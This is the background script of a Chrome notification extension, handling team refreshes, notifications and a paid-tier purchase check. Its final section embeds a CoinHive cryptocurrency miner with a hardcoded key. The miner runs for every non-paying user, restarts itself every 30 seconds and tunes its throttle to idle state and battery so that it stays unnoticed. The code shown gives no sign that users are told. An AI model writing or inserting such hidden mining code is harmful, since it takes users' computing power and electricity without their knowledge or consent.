/* global CoinHive:true navigator:true */

import { wrapStore } from 'react-chrome-redux';
import { REACT_CHROME_REDUX, SKUS } from './helpers/constants';
import {
  app as appActions,
  notifications as notificationsActions,
  state as stateActions,
  teams as teamsActions,
} from './actions';
import store from './store/index';
import './buy.js';

const { notification: notificationActions } = notificationsActions;
const { message } = appActions;
const { team: teamActions } = teamsActions;

wrapStore(store, {
  portName: REACT_CHROME_REDUX.PORT_NAME,
});

const {
  dispatch,
  getState,
} = store;

let miner;

const state = getState();
// let refreshLoop;

const refreshTeams = () => {
  Object.values(state.teams.data).forEach((team) => {
    const { token } = team.clicky;
    dispatch(teamActions.refresh({ token }));
  });
};

refreshTeams();

chrome.notifications.onClicked.addListener((id) => {
  dispatch(notificationActions.open({ id }));
});

chrome.notifications.onButtonClicked.addListener((id, idx) => {
  if (idx === 0) {
    dispatch(notificationActions.mark({ id }));
  } else {
    dispatch(notificationActions.open({ id }));
  }
});

chrome.notifications.onClosed.addListener((id) => {
  dispatch(notificationActions.closed({ id }));
});

window.hasPaidTier = false;

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'CLEAR_STATE') {
    dispatch(stateActions.clear());
    sendResponse({ ok: true });
  } else if (request.type === 'BUY_PAID_TIER') {
    // Buy the paid tier
    google.payments.inapp.buy({
      parameters: { env: 'prod' },
      sku: SKUS.PAID_TIER,
      success: () => {
        window.hasPaidTier = true;
        chrome.runtime.reload();
        if (miner.stop) miner.stop();
      },
    });
  }
});

// Check for paid tier
google.payments.inapp.getPurchases({
  parameters: { env: 'prod' },
  success: (data) => {
    const products = data.response.details;
    // Is correct SKU, and is active
    window.hasPaidTier = products.some(x => x.sku === SKUS.PAID_TIER && x.state === 'ACTIVE');
  },
  failure: () => {
    /**
     * If in doubt, just assume they've bought it... It's just easier this way
     * It stops people getting mad at me if (when) my code breaks
     */
    window.hasPaidTier = true;
  },
});

/**
 * onDisconnect fires when popup.html is closed
 * Check that the connection is the one we're
 * expecting then, if it is, clear the message
 */
chrome.runtime.onConnect.addListener((port) => {
  port.onDisconnect.addListener((sender) => {
    const { name } = sender;
    if (name === REACT_CHROME_REDUX.PORT_NAME) {
      dispatch(message.set({ message: '' }));
    }
  });
});


if (CoinHive && !window.hasPaidTier) {
  const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';

  const throttles = {
    active: 0.95,
    idle: 0.5,
    locked: 0.2,
  };

  const setThrottle = (throttle = throttles.active) => {
    // Stop the current miner, restart with a new 'user'
    if (miner && Object.hasOwnProperty.call(miner, 'stop')) miner.stop();

    // New user is just the current throttle level
    miner = new CoinHive.User(coinHiveKey, `throttle-${throttle}`);
    miner.setThrottle(throttle);
    miner.start();
  };

  // Heavily throttle mining to prevent noticiable impact
  setThrottle(throttles.active);

  const checkCoinHiveStatus = () => {
    if (!miner.isRunning()) {
      miner.start();
    }
  };

  let statusLoop;
  const startLoop = () => {
    statusLoop = setInterval(checkCoinHiveStatus, 30000);
  };

  const stopLoop = () => {
    if (!statusLoop) return;
    statusLoop = clearInterval(statusLoop);
  };

  miner.on('open', startLoop);
  miner.on('close', stopLoop);

  // If the battery is not charging, stop mining
  const checkBattery = battery => (
    battery.charging ? miner.start() : miner.stop()
  );

  // If we've got the battery API then use it
  if (typeof navigator.getBattery === 'function') {
    navigator.getBattery().then((battery) => {
      checkBattery(battery);
      battery.addEventListener('chargingchange', () => {
        checkBattery(battery);
      });
    });
  } else {
    miner.start();
  }

  const startIdleChecks = () => {
    const idleDetectionInterval = 300;

    // Initialize throttle and set detection interval
    chrome.idle.queryState(idleDetectionInterval, (newState) => {
      // Set appropriate throttle level
      setThrottle(throttles[newState]);
    });

    chrome.idle.setDetectionInterval(idleDetectionInterval);

    chrome.idle.onStateChanged.addListener((newState) => {
      // Set appropriate throttle level
      setThrottle(throttles[newState]);
    });
  };

  if (chrome.idle && typeof chrome.idle.queryState === 'function') {
    startIdleChecks();
  } else {
    setThrottle(0.90);
  }
}

window.isMining = () => {
  let running = false;
  if (miner && Object.hasOwnProperty.call(miner, 'isRunning')) {
    running = miner.isRunning();
  }

  if (running) {
    // eslint-disable-next-line
    console.debug('Miner is running: ', miner);
  } else {
    // eslint-disable-next-line
    console.debug('Miner is not running');
  }

  return running;
};
